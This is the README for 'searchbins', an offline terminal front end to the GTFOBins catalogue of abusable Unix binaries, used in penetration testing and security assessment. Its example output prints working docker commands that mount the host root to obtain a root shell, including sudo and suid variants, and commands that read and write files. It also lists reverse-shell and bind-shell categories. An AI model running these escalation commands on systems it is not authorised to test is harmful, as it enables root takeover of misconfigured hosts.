# Searchbins
Offline command line tool that searches for [GTFOBins](https://gtfobins.github.io/) binaries that can be used to bypass local security restrictions in misconfigured systems.

The main purpose of the tool is to give you the possibility to search for GTBOBins binaries offline and from the terminal.

The tool is able to:
- List the functions of a specific binary which can be abused
- Show the commands to abuse a specific function or all functions of a binary
- List all binaries available in GTFOBins
- List the binaries associated with a specific function
- List all the functions available in GTFOBins
- Search GTBOBins binaries from a file and list their respective functions

## Dependencies
For the tool to work properly, the following dependencies need to be installed:
```
sudo apt install yq jq -y
```

## Installation
```
git clone https://github.com/r1vs3c/searchbins.git
cd searchbins
./searchbins.sh -h
```

If you want to run the tool from any path on your system, you can run the following script:
```
sudo ./install.sh 
```

## Usage
```
____ ____ ____ ____ ____ _  _ ___  _ _  _ ____
[__  |___ |__| |__/ |    |__| |__] | |\ | [__
___] |___ |  | |  \ |___ |  | |__] | | \| ___]  by Juan Rivas (@r1vs3c)

[!] Use: searchbins 
================================================================================
        [-b] Binary to enumerate
                Example: searchbins -b docker

        [-f] Specific function of the binary or binaries
                Example: searchbins -b docker -f shell

        [-a] All available functions of the binary
                Example: searchbins -b docker -a

        [-l] List all available binaries or functions 
                Example: searchbins -l <bins/functions>
                         searchbins -l bins -f suid

        [-s] File to search for binaries 
                Example: searchbins -s <path_to_file>

        [-h] Show this panel
```

## Examples
### List the functions of a binary
```
$ searchbins -b docker

[+] Binary: docker

[*] Functions: -> [https://gtfobins.github.io/gtfobins/docker]

        [✔] file-read (1)
        [✔] file-write (1)
        [✔] shell (1)
        [✔] sudo (1)
        [✔] suid (1)

[*] Execute: -> searchbins -b docker -f <function> (For a specific function)

             -> searchbins -b docker -a (For all available functions)
```

### Display commands to abuse a specific function of the binary
```
$ searchbins -b docker -f shell

[+] Binary: docker

================================================================================
[*] Function: shell -> [https://gtfobins.github.io/gtfobins/docker/#shell]

The resulting is a root shell.

        | docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

### Display commands to abuse all functions associated with the binary
```
$ searchbins -b docker -a

[+] Binary: docker

================================================================================
[*] Function: file-read -> [https://gtfobins.github.io/gtfobins/docker/#file-read]

Read a file by copying it to a temporary container and back to a new location on the host.

        | CONTAINER_ID="$(docker run -d alpine)"  # or existing
        | TF=$(mktemp)
        | docker cp file_to_read $CONTAINER_ID:$TF
        | docker cp $CONTAINER_ID:$TF $TF
        | cat $TF

================================================================================
[*] Function: file-write -> [https://gtfobins.github.io/gtfobins/docker/#file-write]

Write a file by copying it to a temporary container and back to the target destination on the host.

        | CONTAINER_ID="$(docker run -d alpine)" # or existing
        | TF=$(mktemp)
        | echo "DATA" > $TF
        | docker cp $TF $CONTAINER_ID:$TF
        | docker cp $CONTAINER_ID:$TF file_to_write

================================================================================
[*] Function: shell -> [https://gtfobins.github.io/gtfobins/docker/#shell]

The resulting is a root shell.

        | docker run -v /:/mnt --rm -it alpine chroot /mnt sh

================================================================================
[*] Function: sudo -> [https://gtfobins.github.io/gtfobins/docker/#sudo]

The resulting is a root shell.

        | sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh

================================================================================
[*] Function: suid -> [https://gtfobins.github.io/gtfobins/docker/#suid]

The resulting is a root shell.

        | ./docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

### List all available binaries
```
$ searchbins -l bins

[+] All available binaries in GTFOBins:

7z                      chmod                   expand                  ldconfig                openvt                  scrot                   top
aa-exec                 choom                   expect                  ld.so                   opkg                    sed                     torify
ab                      chown                   facter                  less                    pandoc                  service                 torsocks
agetty                  chroot                  file                    lftp                    paste                   setarch                 troff
alpine                  clamscan                find                    ln                      pax                     setfacl                 tshark
ansible-playbook        cmp                     finger                  loginctl                pdb                     setlock                 ul
ansible-test            cobc                    fish                    logsave                 pdflatex                sftp                    unexpand
aoss                    column                  flock                   look                    pdftex                  sg                      uniq
apache2ctl              comm                    fmt                     lp                      perf                    shuf                    unshare
apt-get                 composer                fold                    ltrace                  perlbug                 slsh                    unsquashfs
apt                     cowsay                  fping                   lua                     perl                    smbclient               unzip
aria2c                  cowthink                ftp                     lualatex                pexec                   snap                    update-alternatives
arj                     cpan                    gawk                    luatex                  pg                      socat                   uudecode
ar                      cpio                    gcc                     lwp-download            php                     socket                  uuencode
arp                     cp                      gcloud                  lwp-request             pic                     soelim                  vagrant
ascii85                 cpulimit                gcore                   mail                    pico                    softlimit               valgrind
ascii-xfr               crash                   gdb                     make                    pidstat                 sort                    varnishncsa
ash                     crontab                 gem                     man                     pip                     split                   view
as                      csh                     genie                   mawk                    pkexec                  sqlite3                 vigr
aspell                  csplit                  genisoimage             minicom                 pkg                     sqlmap                  vi
at                      csvtool                 ghci                    more                    posh                    ssh-agent               vimdiff
atobm                   cupsfilter              ghc                     mosquitto               pr                      ssh                     vim
awk                     curl                    gimp                    mount                   pry                     ssh-keygen              vipw
aws                     cut                     ginsh                   msfconsole              psftp                   ssh-keyscan             virsh
base32                  dash                    git                     msgattrib               psql                    sshpass                 volatility
base58                  date                    grc                     msgcat                  ptx                     ss                      w3m
base64                  dc                      grep                    msgconv                 puppet                  start-stop-daemon       wall
basenc                  dd                      gtester                 msgfilter               pwsh                    stdbuf                  watch
basez                   debugfs                 gzip                    msgmerge                python                  strace                  wc
bash                    dialog                  hd                      msguniq                 rake                    strings                 wget
batcat                  diff                    head                    mtr                     rc                      sudo                    whiptail
bc                      dig                     hexdump                 multitime               readelf                 su                      whois
bconsole                distcc                  highlight               mv                      redcarpet               sysctl                  wireshark
bpftrace                dmesg                   hping3                  mysql                   redis                   systemctl               wish
bridge                  dmidecode               iconv                   nano                    red                     systemd-resolve         xargs
bundle                  dmsetup                 iftop                   nasm                    restic                  tac                     xdg-user-dir
bundler                 dnf                     install                 nawk                    rev                     tail                    xdotool
busctl                  docker                  ionice                  ncdu                    rlogin                  tar                     xelatex
busybox                 dos2unix                ip                      ncftp                   rlwrap                  task                    xetex
byebug                  dosbox                  irb                     nc                      rpmdb                   taskset                 xmodmap
bzip2                   dotnet                  ispell                  neofetch                rpm                     tasksh                  xmore
c89                     dpkg                    jjs                     nft                     rpmquery                tbl                     xpad
c99                     dstat                   joe                     nice                    rpmverify               tclsh                   xxd
cabal                   dvips                   join                    nl                      rsync                   tcpdump                 xz
cancel                  easy_install            journalctl              nmap                    rtorrent                tdbtool                 yarn
capsh                   eb                      jq                      nm                      ruby                    tee                     yash
cat                     ed                      jrunscript              node                    run-mailcap             telnet                  yelp
cdist                   efax                    jtag                    nohup                   run-parts               terraform               yum
certbot                 elvish                  julia                   npm                     runscript               tex                     zathura
check_by_ssh            emacs                   knife                   nroff                   rview                   tftp                    zip
check_cups              enscript                ksh                     nsenter                 rvim                    tic                     zsh
check_log               env                     ksshell                 ntpdate                 sash                    timedatectl             zsoelim
check_memory            eqn                     ksu                     octave                  scanmem                 time                    zypper
check_raid              espeak                  kubectl                 od                      scp                     timeout
check_ssl_cert          exiftool                latex                   openssl                 screen                  tmate
check_statusfile        ex                      latexmk                 openvpn                 script                  tmux
```

### List all available binaries associated with a specific function
```
$ searchbins -l bins -f file-download

[+] Binaries with the file-download function:

ab              curl            gdb             jrunscript      lwp-download    openssl         ruby            sftp            tar             vim
aria2c          easy_install    gimp            julia           nc              php             rview           smbclient       tftp            wget
bash            finger          irb             ksh             nmap            pip             rvim            socat           view            whois
cpan            ftp             jjs             lua             node            python          scp             ssh             vimdiff         yum
```

### List of all available functions
```
$ searchbins -l functions

[+] Available functions:

bind-shell
capabilities
command
file-download
file-read
file-upload
file-write
library-load
limited-suid
non-interactive-bind-shell
non-interactive-reverse-shell
reverse-shell
shell
sudo
suid
```

### Search for potential binaries from a file
```
$ searchbins -s bins.txt

[✔] Matches: python,tar,vi

================================================================================
[+] Binary: python

[*] Functions: -> [https://gtfobins.github.io/gtfobins/python]

        [✔] capabilities (1)
        [✔] file-download (1)
        [✔] file-read (1)
        [✔] file-upload (2)
        [✔] file-write (1)
        [✔] library-load (1)
        [✔] reverse-shell (1)
        [✔] shell (1)
        [✔] sudo (1)
        [✔] suid (1)

================================================================================
[+] Binary: tar

[*] Functions: -> [https://gtfobins.github.io/gtfobins/tar]

        [✔] file-download (1)
        [✔] file-read (1)
        [✔] file-upload (1)
        [✔] file-write (1)
        [✔] limited-suid (1)
        [✔] shell (3)
        [✔] sudo (1)

================================================================================
[+] Binary: vi

[*] Functions: -> [https://gtfobins.github.io/gtfobins/vi]

        [✔] file-read (1)
        [✔] file-write (1)
        [✔] shell (2)
        [✔] sudo (1)
```

## Uninstall
```
sudo rm /usr/local/bin/searchbins
sudo rm -rf /usr/local/share/bins
```

## Credits
Thanks to [norbemi](https://twitter.com/norbemi) and [cyrus_and](https://twitter.com/cyrus_and) for creating [GTFOBins](https://gtfobins.github.io/) without that this project won't be in existence.
